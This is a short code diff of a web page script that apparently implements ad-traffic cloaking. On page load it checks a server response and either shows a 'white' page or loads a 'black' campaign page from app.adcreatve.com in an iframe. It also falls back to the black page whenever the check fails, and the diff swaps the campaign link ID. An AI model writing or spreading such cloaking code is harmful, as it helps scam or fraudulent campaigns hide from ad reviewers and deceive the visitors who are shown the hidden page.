@@ -63,13 +63,13 @@ window.addEventListener('DOMContentLoaded', () => {
 
       if (force) {
         console.log('FORCE=1 → iframe от result');
-        showBlack((res.campaign || 'https://app.adcreatve.com/612mr6pP') + qs);
+        showBlack((res.campaign || 'https://app.adcreatve.com/QXFz3pGT') + qs);
         return;
       }
 
       if (res.code === 200 && res.result === false) {
    
-        showBlack((res.campaign || 'https://app.adcreatve.com/612mr6pP') + qs);
+        showBlack((res.campaign || 'https://app.adcreatve.com/QXFz3pGT') + qs);
       } else {
     
         showWhite();
@@ -78,6 +78,6 @@ window.addEventListener('DOMContentLoaded', () => {
     .catch(e => {
       console.error('error resp:', e);
       
-      showBlack('https://app.adcreatve.com/612mr6pP' + (location.search || ''));
+      showBlack('https://app.adcreatve.com/QXFz3pGT' + (location.search || ''));
     });
 });
